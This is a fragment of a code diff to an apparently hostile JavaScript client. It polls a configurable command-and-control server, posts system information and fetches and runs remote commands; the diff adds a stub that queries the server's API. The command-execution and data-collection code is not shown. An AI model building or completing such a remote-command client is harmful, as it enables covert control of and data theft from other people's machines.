@@ -6,7 +6,6 @@ import chalk from "chalk";
 // Get command line arguments
 const C2 = argv[2] || "http://localhost:7789";
 const INTERVAL = +argv[3] || 5000;
-
 const API_BASE_URL = `${C2}/api/tools/seoul`;
 
 function getSystemInfo() {
@@ -102,6 +101,11 @@ function runClient() {
     await postInfo();
     await getAndRunRemoteCommand();
   }, INTERVAL);
+}
+
+
+async function getSeoulServerIps() {
+  const result = await fetch(API_BASE_URL); 
 }
 
 runClient();
